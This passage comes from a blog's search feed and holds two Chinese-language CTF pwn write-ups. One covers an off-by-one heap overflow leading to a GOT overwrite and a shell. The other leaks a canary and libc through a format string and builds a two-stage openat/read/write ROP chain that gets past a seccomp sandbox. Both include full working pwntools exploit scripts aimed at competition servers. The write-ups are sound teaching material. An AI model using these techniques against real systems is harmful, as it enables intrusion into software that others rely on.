      <categories>
        <category>BUU刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcontraining_heapcreator</title>
    <url>/2024/07/11/BUU%E5%88%B7%E9%A2%98/hitcontraining_heapcreator/</url>
    <content><![CDATA[<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102332737.png" alt="image-20240710233212702"></p>
<span id="more"></span>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>​	一共有<em>create_heap</em>，<em>edit_heap</em>，<em>show_heap</em>，<em>delete_heap</em>四个函数，<em>edit_heap</em>函数中有一个堆溢出漏洞，只可以溢出<code>1</code>个字节。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101814056.png" alt="image-20240710181416024" style="zoom: 80%;" />

<p>​	本题中，每<em>malloc</em>一次会创建一个指针<em>chunk</em>和一个内容<em>chunk</em>（其实就是两个地址空间，分别存储着指向<em>chunk</em>中数据的指针，和<em>chunk</em>的数据），而<em>free</em>一次也就是把这两个地址空间都释放掉了。<em>show_heap</em>和<em>edit_heap</em>函数中打印和修改的内容都是由指针决定的，指针指向什么就打印和修改什么。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="改写-size"><a href="#改写-size" class="headerlink" title="改写_size_"></a>改写_size_</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line"><span class="comment">#往_chunk0_中写入&#x27;/bin/sh\x00&#x27;，后面free(chunk0)的时候其实就是system(&quot;/bin/sh&quot;)</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>

<p>​	先创建两个<em>chun</em>，<code>0x18</code>是为了在往<em>chunk0</em>中写内容时，直接覆盖掉<em>chunk1</em>的指针<em>chunk</em>的前<code>8</code>个字节，然后就可以利用溢出的一个字节改写<em>chunk1</em>的指针<em>chunk</em>的<em>size</em>。</p>
<p>如图，指针<em>chunk</em>的<em>size</em>值已经被改写成<code>0x41</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101923019.png" alt="image-20240710192301972"></p>
<p>​	此时，<em>chunk1</em>的指针<em>chunk</em>与内容<em>chunk</em>，已经部分重叠（因为是指针<em>chunk</em>的<em>size</em>被改写成<code>0x41</code>，内容<em>chunk</em>的<em>size</em>还是<code>0x21</code>，所以如图</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102116011.png" alt="image-20240710192301977" style="zoom:80%;" />

<h3 id="泄漏-free-addr"><a href="#泄漏-free-addr" class="headerlink" title="泄漏_free_addr_"></a>泄漏_free_addr_</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line"><span class="comment">#指针前面0x30是能存储数据的大小，不能改变</span></span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><code>delete(1)</code>后我们可以看到<em>fastbins</em>有两个不同大小的<em>fastbin_chunk</em>，如图</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102122798.png" alt="image-20240710212229702"></p>
<p>​	然后我们再申请<code>0x30</code>的<em>chunk</em>用来存储数据（还有<code>0x10</code>的空间存储<em>prve_size</em>和<em>size</em>），又因为<em>fastbins</em>中正好有<code>0x40</code>的<em>fastbins_chunk</em>，所以<code>0x12c2040</code>及下面<code>0x40</code>的内存空间就成了新<em>chunk</em>的内存<em>chunk</em>，<code>0x12c2060</code>及下面<code>0x20</code>的内存空间就成了新<em>chunk</em>的指针内存。</p>
<p>​	然后我们把<em>free@got</em>写到内存<em>chunk</em>的<code>0x12c2078</code>地址里，这个地址存储着指针<em>chunk</em>里的指针，所以现在指针就是<em>free@got</em>，而<em>show</em>函数打印出来的数据是该指针指向的内容，也就是<em>free@got</em>指向的内容。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102155262.png" alt="image-20240710215550221"></p>
<h3 id="覆盖-free-got-表"><a href="#覆盖-free-got-表" class="headerlink" title="覆盖_free@got_表"></a>覆盖_free@got_表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>​	同样，<em>edit</em>函数修改<em>chunk</em>内容，也是修改指针<em>chunk</em>的指针指向的区域。得到<em>system</em>的地址后，直接用<em>edit</em>函数修改<em>chunk1</em>的内容即可。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102208262.png" alt="image-20240710220849174"></p>
<p>最后直接<em>free</em>掉<em>chunk0</em>，便能执行<code>system(&quot;/bin/sh&quot;)</code>，得到<em>shell</em>。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28974</span>)</span><br><span class="line">debug(p,<span class="number">0x400DC4</span>,<span class="number">0x400DB8</span>,<span class="number">0x400DD0</span>,<span class="number">0x400DDC</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102221509.png" alt="image-20240710222113464"></p>
]]></content>
      <categories>
        <category>BUU刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>off-by-one</tag>
      </tags>
  </entry>
  <entry>
    <title>NKCTF_Maimai查分器</title>
    <url>/2024/03/23/%E8%B5%9B%E9%A2%98wp/NKCTF-Maimai%E6%9F%A5%E5%88%86%E5%99%A8/</url>
    <content><![CDATA[<h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li><p>当栈溢出的字节数不能满足我们构造完整的<code>rop</code>链时，除了栈迁移我们还可以先构造一个<code>read</code>的<code>rop</code>链，让程序再<code>read</code>一次，然后再写入<code>rop</code>链覆盖我们调用<code>read</code>时自己写的返回地址，以控制执行流执行<code>rop</code>链。</p>
<span id="more"></span>
</li>
<li><p>有的程序开了沙箱会过滤一些函数，除了<code>system</code>其他函数如<code>open</code>也可能被过滤，可以使用命令<code>seccomp-tools dump ./pwn</code>查看。</p>
</li>
<li><p><code>openat</code>函数也是一个类似于<code>open</code>的打开文件的函数，<code>openat</code>函数有<code>4</code>个参数。<code>openat</code>函数的第一个参数如果是<code>0</code>，其第二个参数必须为文件的绝对路径；第二个参数如果是文件的相对路径，其第一个参数需为相对路径前的路径。</p>
</li>
<li><p>知道了<code>libc</code>基地址，我们需要任何没见过的函数都可以到<code>libc</code>中寻找，如果利用<code>ROPgadget --binary pwn | grep &quot;gadget&quot;</code>没找到<code>gadget</code>，我们也可以去<code>libc</code>中寻找。利用<code>ROPgadget --binary libc.so.6 | grep &quot;gadget&quot;</code>命令，我们找的是偏移<code>gadget_offset</code>，<code>gadget</code>的地址<code>gadget_addr = gadget_offset+libc_base</code>。</p>
</li>
<li><p>在泄漏<code>libc</code>基地址的时候，一般都是随便<code>printf</code>出一个<code>libc</code>中的任意地址，然后在<code>ida</code>中计算偏移。但是如果本地的偏移与远程不同，且我们不容易把本地换成远程的<code>libc</code>，我们可以<code>printf</code>出准确函数函数的<code>libc</code>地址，然后用<code>elf.sym[&#39;read&#39;]</code>这种表示出偏移。</p>
</li>
</ol>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102243265.png" alt="image-20240323232259681"></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244858.png" alt="image-20240323232554875"></p>
<h3 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h3><p>​	有一个格式化字符串漏洞只能输入<code>8</code>字节，和一个栈溢出漏洞。保护全开，我们先泄漏一个<code>canary</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>泄漏<code>libc</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%3$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;read&#x27;</span>]-<span class="number">18</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>泄漏一个栈地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>​	本题拿到<code>shell</code>后没有权限去<code>cat flag</code>，但是我们可以用<code>open-read-write</code>把<code>flag</code>读出并打印出来，又因为过滤了<code>open</code>，所以我们要用一个与<code>open</code>函数类似的<code>openat</code>函数打开文件。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244179.png" alt="image-20240324190744811" style="zoom:80%;" />

<h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置<code>rop</code>链</h3><p>​	因为是<code>64</code>位程序，所以传参需要寄存器，我们在程序里找不到<code>gadget</code>，但是我们可以到<code>libc</code>中找<code>gadget</code>的偏移，再加上<code>libc</code>基地址即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">rdx_r12 = <span class="number">0x000000000011f2e7</span>+libc_base<span class="comment">#0x000000000011f497+libc_base</span></span><br><span class="line">rcx = <span class="number">0x3d1ee</span>+libc_base<span class="comment">#0x000000000008c6bb+libc_base</span></span><br></pre></td></tr></table></figure>

<p>​	程序中我们能溢出<code>80</code>个字节，但是<code>orw_rop</code>链的长度远远超过了<code>0x80</code>个字节，因此我们可以先<code>read</code>一次，<code>read</code>到哪儿呢？<code>read</code>到装返回地址的这个地址里，覆盖我们的返回地址，这样才能继续控制执行流执行接下来的<code>orw_rop</code>链。这个返回地址，是我们在<code>r_rop</code>链中自己布置的，调用完<code>read</code>函数后的返回地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>) <span class="comment">#这个stack+0x38-8是我们后来填上的</span></span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>) <span class="comment">#返回地址随便填，会被orw_rop链覆盖</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#注意这里不能用sendline，因为我们布置的r_rop链已经刚好把0x80个字节占完，再发送一个回车(\n)便会被暂时放在缓冲区，然后被我们再次调用的read读入，而后面发送的orw_rop链也就不会被读入</span></span><br></pre></td></tr></table></figure>

<p>​	然后布置<code>orw_rop</code>链，由于文件描述符<code>0,1,2</code>已被占用，这里我们<code>openat</code>打开的新文件的文件描述符为<code>3</code>，所以<code>read</code>读取<code>flag</code>的第一个寄存器的值应该是<code>3</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)+p64(rdx_r12)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rcx)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;openat&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#read函数的第一个寄存器为要读取数据的文件的文件描述符，即3</span></span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]+libc_base)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node.nkctf.yuzhian.com.cn&quot;</span>,<span class="number">33656</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/wen/Desktop/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">al = p.recvuntil(<span class="string">b&#x27;Select a option:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    payload = <span class="built_in">str</span>(<span class="number">15.0</span>).encode()+<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    payload = <span class="built_in">str</span>(<span class="number">15.0</span>).encode()+<span class="string">b&#x27;SSS+&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%3$p&#x27;</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1a36</span>,<span class="number">0x19ce</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;read&#x27;</span>]-<span class="number">18</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">rdx_r12 = <span class="number">0x000000000011f2e7</span>+libc_base<span class="comment">#0x000000000011f497+libc_base</span></span><br><span class="line">rcx = <span class="number">0x3d1ee</span>+libc_base<span class="comment">#0x000000000008c6bb+libc_base</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">0x100000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)+p64(rdx_r12)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rcx)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;openat&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]+libc_base)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244004.png" alt="image-20240324192822020"></p>
]]></content>
      <categories>
        <category>赛题wp</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>沙箱</tag>
      </tags>
  </entry>
</search>
